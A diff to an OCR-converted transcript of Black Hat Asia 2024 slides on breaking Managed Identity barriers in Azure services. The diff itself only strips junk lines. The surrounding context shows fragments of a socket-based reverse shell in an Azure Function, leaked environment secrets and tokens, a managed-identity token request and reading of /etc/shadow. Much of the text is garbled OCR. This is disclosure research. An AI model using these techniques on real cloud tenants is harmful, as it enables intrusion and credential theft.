@@ -22,7 +22,6 @@ converted_at: "2026-08-12T00:50:42Z"
 **Conference:** Black Hat ASIA 2024  
 **Source:** `BlackHat ASIA 2024-Slides/Nitesh Surana & David Fiser-Breaking Managed Identity Barriers In Azure Services.pdf` (98 pages)
 
-
 ## Slide 1
 
 #### Breaking Managed Iden-ty Barriers in Azure Services
@@ -37,7 +36,6 @@ David Fiser, Nitesh Surana
 —” ~~
 bisekhat—
 ASIAZORIS y 2 SS
-, mn e Ni ' ZL e - = — ¢ |
 Breaking Managed Identity
 Barriers in Azure Services
 David Fiser, Nitesh Surana
@@ -204,11 +202,9 @@ e Authentication
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-pigtichak = 4“ _k _ aN A = a
 ASIA 2024 AEE
 Research
 . . . 2 cos 7) : “scriptFile": "_init_.py",
-e Si aa U lat | Oo n of co aa p ro aa ise ; import azure. functions as func ; ee [
 5 5 “authLevel": "function",
 6 def main(req: func.HttpRequest) -> func.HttpResponse: 6 "type": “httpTrigger",
 7 s=socket. socket (socket.AF_INET, socket. SOCK_STREAM) 7 “direction": "in",
@@ -220,7 +216,6 @@ root
 # 1s
 ls
 headers host.json oryx-manifest.toml requirements.txt reverse
-. . # pwd
 ¢ Configuration changes Pe cement
 «i
 #BHASIA @BlackHatEvents
@@ -288,8 +283,6 @@ e
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-— Ja S wre
-(+) a \ eo . a
 bladkhat = — Ee
 Timeouts
 45m
@@ -333,8 +326,6 @@ unless a new table **passed as arguments**
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-x Pa ™ p
-Oo nat es =a i
 Environment variables
 ¢ Fundamentals
 0@e@e root@ip-172-26-1-174: /home/ubuntu X31 |
@@ -380,7 +371,6 @@ $r8 : OxOO7FFFF7dd4acO + OxO07fFFF7dcf838 OxOO7fffFF7D76f60 + <std::num
 pf x/32bs @x007F FF FFFFE77S
 "XDG_SESSION_ID=59847"
 If “APE. tt veduperSecretibalueti23”
-+ #8 oe ee
 “XDG_DATA_DIRS=/usr/Local/share: /usr/share:/var/Lib/snapd/desktop”
 “LESSOPEN=| /usr/bin/lesspipe %s"
 Ma pasrncngt heated
@@ -415,14 +405,12 @@ elestzbesszozizisis J LL) ) | st; tanle & 1G TOeeet TT Te re revereriririre reec
 mirGOOfiGGa1i11ieeaia 61 11880188111118818 881 1188180011
 Stree atthe 88+ ge Set + geet bye B84 +449 001 | |
 = ees ey o,00000, 79 118 9 200,118 , 80000 8 110 9 200,116,080
-a ee rn 811,118008 1 018 ; 88 81a ; 1600 1 8108 ; 88 ue
 arr visi || 8 119 ;8811lig ,@8I1Gilo 11g ,e8i)110,0
 : H0000 oi080 10 poh: SRE oie080 10; ; ie8ece,)
 PINSIG + NaTMMeTH TOK} -a69Ree725 064-14 Bele? aquepoi. 'i.an901 ti. '1eMGa11!1
 AzureWebJobsStorage
 CONTAINER_ENCRYPTION_KEY
 CONTAINER_START_CONTEXT_SAS_URI
-COMMRINER ee dossigssz oo ; , o 1 Oo 1 *
 a ora ://wawsstorageprodam2177 .bldb. core .windows qz iners/Of8e ronda
 yeaa Pease 2022 “2AT ; -@1-24T15%3A34: ; 7 o Q Q ‘
 ]
@@ -431,7 +419,6 @@ a a 2. core.windows . net/azcontainels/0f8ec002- olbarasr @2- — someon olan
 ETTING_WEBSITE.
 E_STAMP_DEPL( LPs)
 sue a 75E06393876AE07396841AF8 is] o
-| G oO
 s ://storageaccountdef; bd) -net/scm-releases/scm- |= ‘-nebula-' cefip?svaz014-02- sant - cine: samen -1bibr12x3A04x3006zesp—rw o
 Sipe Sorvicemcnampecervice. . Caas-10208470f e9:
 ```
@@ -453,7 +440,6 @@ Storage Account
 ```text
 pis hat
 ASIA 2024
-—fO~ < @ O
 YOU HAVE BEEN HACKED!!!
 AzureWebJobsStorage
 Not Secure — nebula-test.azurewebsites.net
@@ -492,7 +478,6 @@ BASE64 ~
 BASE64 +
 length: 9196
 lines: 1
-+O8) © &
 /cY¥dq+AnpWj ICTECMSDgT5SsgFPGgm6ouZIL2DHqQVF92aun+3ZGuz79neYZQNaC6Zq4htv2WPL1u/0Z7g@WIIDreYyLVME7alLzS
 WNd4cAzWL/bBHZSH8 iedj LUVasR9@U8qYoN1TR1Y5mqCPesCHFDmDOqUoZQUHYmco290YqnpGFLLFt LY7UZQUXvVdEiEkDsDSQrelA.
 NoeFRcIvnEZ/Hkaa4yeyg214b1TBz71cT7Lf/TFG3F0783HzpwgvEe Lbu+HWAWV f d8WK9MOe0y8q4eHKvqwa9uqXBTSfLbNr2oUms
@@ -512,7 +497,6 @@ t5+13gi6czwxv3i6Ypa+YSXrDKJEGIXEwB3v1BL3JLUhSPL3FbKq72Z6LixL6nhd+i/n12+fKAak2m//
 NMdyLsaKeo9UW7E f+6s6BeFv2EhAoK/V ipGPX+DyPw61VvQaHO@Sqk/oKzPo40CoRBD i0yoN4WanvLNOn7SwgzDzvXxXf iYnIOFyuGTH
 ysQcXXKs 1CBNynm7@vV9H1vECy2B5UpvE fbknFarwlPX/Q4eqvkRt8L26gKT8JpkBXCJ Tm/GGaUIgX/aj BUbQz1al+YA@2Cy9cVxU!
 PA ane en ar te in on ats ee rane nun ant ea nan erin. Reni Wen ata. ken nea an
-start: t) a o ra r
 end: 6891
 length: 6891
 {"SiteId":767064730,"SiteName":"nebula-test","EncryptedEnvironment":"3 | VizDzTy30ag/PHD1E7gwWg==
@@ -572,7 +556,6 @@ Image
 A
 blackhat
 em: LOR OF
-A AAA A
 if
 Managed Identities
 GET /msi/token?resource=https : //management .azure.com&api-version=2019-@8-@1 HTTP/1.1
@@ -590,7 +573,6 @@ Transfer-Encoding: chunked
 WNDc1MZEt YWULY 1 Q@MmQOLWE4NmQtZDZmMDUON j BmOWU@L yIs ImLhdCI6MTYQODczZMTYSNSwibmJmI joxNjQ4Nzh
 ci 161jIiLCJpZHAi0iJodHRwczovL3N@cy53aW5kb3dzLm5LdC8zZTA@NZUZYS1hZTViLTQyZDQtYTg2ZC1kNmYv
 #BHASIA
-cachet —— = 2 4 =< ~
 @BlackHatEvents
 ```
 
@@ -676,11 +658,9 @@ What do you suggest David?
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-ad —- —
 bi§ekhat :
 ASIA 2024
 Why: ram (argc + 5) * ( *);
-eee f-~  < @ © Not Secure — nebula-custom.azurewebsites.net @ ® (5 + 68
 Cloud
 Stronger Cloud Security in Azure Functions
 Using Custom Cloud Container
@@ -820,9 +800,7 @@ Approach
 
 ```text
 oa
-A _— - ad
 lackh - yo. N
-b ASIA hat Zé \x co
 Storage
 . Account's
 | Access Key
@@ -851,7 +829,6 @@ System Assigned Managed Identity
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-bifekhat = <7 _ an ane Lee = a
 ASIA 2024 ’ as
 Sign in with a managed identity
 On resources configured for managed identities for Azure resources, you can sign
@@ -881,7 +858,6 @@ idenBtyresponderd
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-piStkhat - —— __ a as — | = a
 identityresponderd
 [Unit ]
 Description=Azure Batch AI Identity Responder Daemon
@@ -911,7 +887,6 @@ ie
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-piSdkhat a a All __ —S =
 identityresponderd
 /etc/environment.sso =m MST_ENDPOINT=http://127.0.0.1:46808/MSI/auth
 MST_SECRET=6cvsq LMIRvVIyURbztZ3P
@@ -979,11 +954,9 @@ I |
 (
 | |
 wy I
-. wv .
 I |
 401 Unauthorized
 \ ]
-ee ee ee -
 #BHASIA @BlackHatEvents
 ```
 
@@ -1008,7 +981,6 @@ ee ee ee -
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-biSekhat ra —— = a3 me
 ASIA 2024
 dsimountagent
 [Unit]
@@ -1046,7 +1018,6 @@ azureuser : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND= **/usr/bin/cat /etc/shadow*
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-— Ss : mr
 biSekhat A __g C ae
 ASIA 2024 es i “Ne o-
 | MLSEQ | Spying The Scientist
@@ -1142,7 +1113,6 @@ $AZ_BATCHAI_XDS_ENDPOINT
 
 ```text
 nt =
-mers: - Se x > —a
 "name": “amldemo",
 "id": "/subscriptions/ ire:
 "location": "eastasia",
@@ -1215,7 +1185,6 @@ Does rotating the key help?
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-oo CG 08 & azure.com, 103%
 Hor
 3B amidemo x
 Azure c Learn
@@ -1266,7 +1235,6 @@ _Does the story end here?_
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-biStkhat ae ; = _ =e ae ~
 ASIA 2024
 Does the story end here?
 ```
@@ -1395,7 +1363,6 @@ Entra ID JWT of Managed Identity
 
 ```text
 ASIA 2024
-piSdkhat a > ae : _-
 Malicious Activity
 if
 “RequestType": "getaadtoken",
@@ -1417,7 +1384,6 @@ Entra ID JWT of Managed Identity
 
 ```text
 A
-= / a \ \ a
 blackhat NN > ,
 ASIA 2024
 Generated Logs
@@ -1465,7 +1431,6 @@ h"ps://learn.microso1.com/en-us/azure/ac5ve-directory/managed-iden55es-azure-res
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-Qa =~ ie iy ae
 blackhat , - = ‘
 ASIA 2024 ~~ \
 System assigned Some Azure resources, such as virtual mactwnes allow you
@@ -1696,7 +1661,6 @@ Source: https://surveysparrow.com/blog/funny-customer-service-memes/
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-biSekhat N ie ee a ues
 ASIA 2024
 Q/A
 | HAVE A VERY PARTICULAR SET OF SKILLS.
